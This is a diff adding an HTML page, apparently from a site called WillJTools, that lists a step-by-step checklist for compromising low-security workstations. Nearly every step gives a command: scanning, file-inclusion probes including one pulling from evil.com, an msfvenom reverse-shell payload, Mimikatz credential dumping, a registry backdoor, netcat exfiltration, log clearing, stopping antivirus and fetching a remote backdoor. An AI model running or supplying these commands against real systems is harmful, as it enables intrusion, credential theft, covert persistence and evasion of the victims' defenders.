@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WillJTools Low-Point Workstation Checklist</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <h1>Low-Point Workstation Exploitation Checklist</h1>
+        <nav>
+            <a href="index.html">Back to Home</a>
+        </nav>
+    </header>
+    <main>
+        <article>
+            <h2>Steps for Exploiting Low-Security Workstations</h2>
+            <ul>
+                <li><strong>Network Reconnaissance:</strong> Command: <code>nmap -sS -A -T4 x.x.x.x</code></li>
+                <li><strong>Identify Running Services:</strong> Use <code>netstat -antp</code> to find active connections and services.</li>
+                <li><strong>Vulnerability Scan:</strong> Command: <code>nikto -h x.x.x.x</code> or <code>openvas-start</code></li>
+                <li><strong>Exploit Common Vulnerabilities:</strong> Utilize <code>searchsploit</code> to find exploits for identified vulnerabilities.</li>
+                <li><strong>Manual Testing:</strong> Perform manual security testing based on the results from automated scans.</li>
+                <li><strong>Privilege Escalation:</strong> Use tools like <code>sudo -l</code> and search for sudo misconfigurations.</li>
+                <li><strong>Session Hijacking:</strong> Attempt to hijack sessions using cookies or tokens if applicable.</li>
+                <li><strong>Local File Inclusion:</strong> Test for local file inclusion vulnerabilities. Command: <code>curl http://x.x.x.x/page=../../../../etc/passwd</code></li>
+                <li><strong>Remote File Inclusion:</strong> Check for remote file inclusion by including remote files. Command: <code>curl http://x.x.x.x/page=http://evil.com/malicious.php</code></li>
+                <li><strong>Deploy Malware:</strong> Use `msfvenom` to create and transfer malware. Command: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x -f exe > shell.exe</code></li>
+                <li><strong>Extract Credentials:</strong> Use credential dumping tools like `Mimikatz`. Command: <code>mimikatz.exe "privilege::debug sekurlsa::logonPasswords"</code></li>
+                <li><strong>Persistence Establishment:</strong> Add registry keys for startup programs. Command: <code>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Backdoor" /d "C:\path\to\malware.exe"</code></li>
+                <li><strong>Data Exfiltration:</strong> Exfiltrate data using `nc` or `scp`. Command: <code>nc -w 3 x.x.x.x 5555 < file.txt</code></li>
+                <li><strong>Cover Tracks:</strong> Clean event logs using PowerShell. Command: <code>Clear-EventLog -LogName Application, System</code></li>
+                <li><strong>Network Traffic Analysis:</strong> Monitor and analyze outgoing and incoming network packets. Command: <code>tcpdump -i eth0</code></li>
+                <li><strong>Automate Data Harvesting:</strong> Script routine tasks to gather data periodically. Example: Cron jobs or scheduled tasks.</li>
+                <li><strong>Security Software Identification:</strong> Identify and disable running security software. Command: <code>sc stop "Antivirus"</code></li>
+                <li><strong>Remote Control Setup:</strong> Establish backdoors for remote control. Command: <code>rundll32.exe url.dll,FileProtocolHandler http://x.x.x.x/backdoor.exe</code></li>
+                <li><strong>Report Generation:</strong> Document the exploitation process thoroughly for reporting.</li>
+                <li><strong>Operational Security Review:</strong> Continuously assess and improve operational security practices.</li>
+            </ul>
+        </article>
+    </main>
+    <footer>
+        <p Copyright 2024 WillJTools</p>
+    </footer>
+</body>
+</html>
